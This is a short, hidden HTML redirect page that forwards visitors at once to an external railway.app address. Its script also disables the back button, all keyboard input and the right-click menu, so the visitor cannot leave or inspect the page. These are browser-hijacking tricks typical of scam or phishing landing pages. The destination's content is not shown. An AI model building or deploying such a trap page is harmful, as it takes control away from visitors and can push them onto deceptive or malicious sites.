<!DOCTYPE html>
<html style="display:none;">
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <meta http-equiv="refresh" content="0; url=https://web-production-c2a9d.up.railway.app/">
    <script>
        // Prevent going back
        history.pushState(null, '', location.href);
        window.onpopstate = function() {
            history.go(1);
        };
        
        // Disable keyboard shortcuts
        document.onkeydown = function(e) {
            return false;
        };
        
        // Disable right click
        document.oncontextmenu = function(e) {
            return false;
        };
        
        // Immediate redirect
        window.location.replace('https://web-production-c2a9d.up.railway.app/');
    </script>
</head>
<body></body>
</html>
